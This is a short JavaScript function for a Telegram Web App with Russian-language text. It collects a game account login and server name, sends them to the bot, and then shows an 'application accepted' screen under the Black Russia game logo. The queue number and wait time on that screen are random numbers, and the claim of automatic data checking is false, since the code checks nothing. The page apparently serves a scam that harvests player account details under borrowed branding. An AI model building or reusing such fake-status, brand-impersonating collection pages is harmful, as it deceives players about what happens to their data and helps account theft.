function sendData() {
    const login = document.getElementById('login').value;
    const server = document.getElementById('server').value;
    
    if (login === "" || server === "") {
        alert("Пожалуйста, заполните все поля!");
        return;
    }

    const dataToSend = JSON.stringify({
        login: login,
        server: server
    });

    try {
        Telegram.WebApp.sendData(dataToSend);
    } catch (e) {
        console.error("Ошибка:", e);
    }

    const queueNumber = Math.floor(Math.random() * 99) + 1;
    const waitTime = Math.floor(Math.random() * (15 - 5 + 1)) + 5;

    document.body.innerHTML = `
        <div style="display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background-color: #000; color: #fff; font-family: sans-serif; text-align: center; padding: 20px;">
            <img src="https://blackrussia.online/assets/img/logo.png" style="width: 120px; margin-bottom: 30px;">
            <h1 style="color: #ff0000; font-size: 24px; text-transform: uppercase; margin-bottom: 20px;">ЗАЯВКА ПРИНЯТА</h1>
            <p style="font-size: 18px; margin-bottom: 10px;">Ваша очередь: <b style="font-size: 24px;">${queueNumber}</b></p>
            <p style="font-size: 14px; color: #aaa; max-width: 300px;">Пожалуйста, ожидайте от ${waitTime} до 20 минут и более. Проверка данных проходит в автоматическом режиме.</p>
            <button onclick="Telegram.WebApp.close()" style="background-color: #ff0000; color: white; border: none; padding: 12px 30px; border-radius: 5px; font-weight: bold; margin-top: 20px;">ЗАКРЫТЬ</button>
        </div>
    `;
}
